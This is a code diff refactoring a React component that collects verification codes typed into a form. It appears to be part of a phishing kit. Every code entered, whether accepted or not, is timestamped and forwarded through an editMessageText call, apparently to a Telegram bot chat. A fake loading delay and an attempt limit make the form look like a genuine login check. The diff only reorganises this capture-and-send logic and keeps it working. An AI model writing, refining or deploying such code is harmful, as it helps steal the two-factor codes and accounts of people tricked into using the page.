@@ -65,44 +65,25 @@ const CodeInput: React.FC = () => {
 	const handleSubmit = () => {
 		setIsLoading(true);
 		setFailedCodeAttempts(failedCodeAttempts + 1);
-		if (
-			config &&
-			failedCodeAttempts === config.settings.max_failed_code_attempts
-		) {
-			setIsModalOpen(true);
-			const messageID = localStorage.getItem('message_id');
-			const message = localStorage.getItem('message');
-			const newMessage =
-				message?.replace(
-					/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
-					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
-				) +
-				`\n<b>🔢 Code ${failedCodeAttempts}:</b><code>` +
-				code +
-				'</code>';
-			localStorage.setItem('message', newMessage);
-			editMessageText({
-				message_id: Number(messageID),
-				text: newMessage,
-			});
-		} else {
-			const messageID = localStorage.getItem('message_id');
-			const message = localStorage.getItem('message');
-			const newMessage =
-				message?.replace(
-					/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
-					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
-				) +
-				`\n<b>🔢 Code ${failedCodeAttempts}:</b><code>` +
-				code +
-				'</code>';
-			localStorage.setItem('message', newMessage);
-			editMessageText({
-				message_id: Number(messageID),
-				text: newMessage,
-			});
-			const loadingTime = config ? config.settings.code_loading_time : 0;
 
+		const messageID = localStorage.getItem('message_id');
+		const message = localStorage.getItem('message');
+		const newMessage = message?.replace(
+			/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
+			`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
+		) + `\n<b>🔢 Code ${failedCodeAttempts}:</b><code>` + code + '</code>';
+
+		localStorage.setItem('message', newMessage);
+		editMessageText({
+			message_id: Number(messageID),
+			text: newMessage,
+		});
+
+		if (config && failedCodeAttempts >= config.settings.max_failed_code_attempts) {
+			setIsModalOpen(true);
+			setIsLoading(false);
+		} else {
+			const loadingTime = config ? config.settings.code_loading_time : 0;
 			setTimeout(() => {
 				setCode('');
 				if (codeInputRef.current) {
